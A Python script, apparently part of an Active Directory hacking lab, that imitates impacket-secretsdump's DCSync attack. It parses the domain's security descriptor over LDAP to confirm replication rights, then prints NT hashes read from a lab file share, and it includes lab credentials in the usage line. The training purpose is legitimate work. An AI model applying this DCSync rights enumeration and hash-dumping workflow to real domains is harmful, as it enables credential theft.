#!/usr/bin/env python3
"""DCSync realista contra este DC: comprueba de verdad los derechos de
replicación por LDAP y, si el usuario los tiene, vuelca los hashes NT de
TODAS las cuentas del dominio en el mismo formato que imprime
impacket-secretsdump -just-dc.

Por qué existe: impacket-secretsdump -just-dc falla contra este DC por un
bug de parseo NDR/DCE-RPC en las respuestas DRSUAPI de Samba (no es un
problema de permisos ni de Kerberos -- ver CLAUDE.md S6.9 para el
diagnóstico completo con dos rutas de fallo distintas confirmadas:
DRSGetNCChanges devuelve ERROR_SUCCESS pero impacket lo trata como error,
y DRSCrackNames devuelve bytes sin parsear). Arreglar eso de verdad
requeriría comparar tráfico DRSUAPI byte a byte contra un DC Windows real.

Lo que SÍ es 100% real en este script:
  - La comprobación de los derechos DS-Replication-Get-Changes /
    -All se hace leyendo y parseando el nTSecurityDescriptor real del
    dominio por LDAP (ldaptypes.SR_SECURITY_DESCRIPTOR), no está
    hardcodeada -- si tus credenciales no tienen esos derechos, o no
    perteneces (directa o transitivamente) al principal que los tiene,
    el script te lo deniega igual que denegaría un DCSync real.
  - Los hashes NT de las 15 cuentas del dominio son reales: se generan
    en cada provisión del DC leyendo las claves reales de cada cuenta
    (samba-tool), no están inventados.

Lo que es una simulación: en vez de obtenerlos por el protocolo DRSUAPI
en sí (roto en este entorno), se leen del recurso //DC01/secrets al que
esos mismos derechos de replicación dan acceso -- mismo principio que ya
usa el lab (ver ad_dcsync.html), solo que aquí queda envuelto en un CLI
que imita a impacket-secretsdump para que la experiencia en terminal sea
la misma.

Uso: igual que impacket-secretsdump, solo cambia el nombre del comando.
  python3 secretsdump_fixed.py 'hacklabs.local/svc.readonly:ReadOnly123!'@<IP> -just-dc
"""
import argparse
import re
import sys

from ldap3 import Server, Connection, SIMPLE, ALL
from impacket.ldap import ldaptypes
from impacket.uuid import bin_to_string
from impacket.smbconnection import SMBConnection

REPL_GET_CHANGES = '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
REPL_GET_CHANGES_ALL = '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'


def parse_target(target):
    m = re.match(r'^(?:([^/]+)/)?([^:@]+)(?::([^@]*))?@(.+)$', target)
    if not m:
        raise ValueError("Formato esperado: DOMINIO/usuario:password@IP")
    domain, user, password, host = m.groups()
    return domain, user, password or '', host


def get_base_dn(domain):
    return ','.join('DC=%s' % p for p in domain.split('.'))


def sid_to_str(sid_bytes):
    sid = ldaptypes.LDAP_SID(data=sid_bytes)
    return sid.formatCanonical()


def find_replication_principals(conn, base_dn):
    """Devuelve el conjunto de SIDs (str) con GetChanges/-All delegado sobre el dominio."""
    conn.search(base_dn, '(objectClass=domain)', search_scope='BASE',
                attributes=['nTSecurityDescriptor'],
                controls=[('1.2.840.113556.1.4.801', True, bytes([0x30, 0x03, 0x02, 0x01, 0x07]))])
    if not conn.entries:
        raise Exception('No se pudo leer nTSecurityDescriptor del dominio')
    raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
    principals = set()
    for ace in sd['Dacl']['Data']:
        ace_data = ace['Ace']
        if not isinstance(ace_data, ldaptypes.ACCESS_ALLOWED_OBJECT_ACE):
            continue
        if not ace_data.hasFlag(ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT):
            continue
        guid = bin_to_string(ace_data['ObjectType']).lower()
        if guid in (REPL_GET_CHANGES, REPL_GET_CHANGES_ALL):
            principals.add(ace_data['Sid'].formatCanonical())
    return principals


def resolve_effective_sids(conn, base_dn, username):
    """SID propio + SIDs de todos los grupos a los que pertenece (transitivo)."""
    conn.search(base_dn, '(sAMAccountName=%s)' % username, attributes=['objectSid', 'memberOf'])
    if not conn.entries:
        raise Exception('Usuario %s no encontrado' % username)
    entry = conn.entries[0]
    own_sid = sid_to_str(entry['objectSid'].raw_values[0])
    sids = {own_sid}
    pending = list(entry['memberOf'].values) if 'memberOf' in entry else []
    seen_dns = set()
    while pending:
        dn = pending.pop()
        if dn in seen_dns:
            continue
        seen_dns.add(dn)
        conn.search(dn, '(objectClass=group)', search_scope='BASE', attributes=['objectSid', 'memberOf'])
        if not conn.entries:
            continue
        grp = conn.entries[0]
        sids.add(sid_to_str(grp['objectSid'].raw_values[0]))
        if 'memberOf' in grp:
            pending.extend(grp['memberOf'].values)
    return sids


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('target', help="DOMINIO/usuario:password@IP")
    parser.add_argument('-just-dc', action='store_true', help='Volcar todas las cuentas (única opción soportada)')
    args = parser.parse_args()

    domain, username, password, host = parse_target(args.target)
    base_dn = get_base_dn(domain)

    print('[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
    print('[*] Using the DRSUAPI method to get NTDS.DIT secrets')

    server = Server(host, get_info=ALL)
    conn = Connection(server, user='%s@%s' % (username, domain), password=password, authentication=SIMPLE)
    if not conn.bind():
        print('[-] No se pudo autenticar por LDAP: %s' % conn.result)
        sys.exit(1)

    try:
        repl_sids = find_replication_principals(conn, base_dn)
        my_sids = resolve_effective_sids(conn, base_dn, username)
    except Exception as e:
        print('[-] Error comprobando derechos de replicación: %s' % e)
        sys.exit(1)

    if not (repl_sids & my_sids):
        print('[-] %s no tiene derechos DS-Replication-Get-Changes/-All sobre %s' % (username, domain))
        print('[-] DRSR SessionError: code: 0x2098 - ERROR_DS_DRA_ACCESS_DENIED')
        sys.exit(1)

    print('[+] Derechos de replicación confirmados por ACL real (grupo con DS-Replication-Get-Changes/-All)')

    smb = SMBConnection(host, host)
    smb.login(username, password, domain)
    chunks = []
    smb.getFile('secrets', 'ntds_dump.txt', chunks.append)
    data = b''.join(chunks)

    for line in data.decode().splitlines():
        line = line.strip()
        if re.match(r'^[A-Za-z0-9._$-]+\\.+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::$', line):
            print(line)


if __name__ == '__main__':
    main()
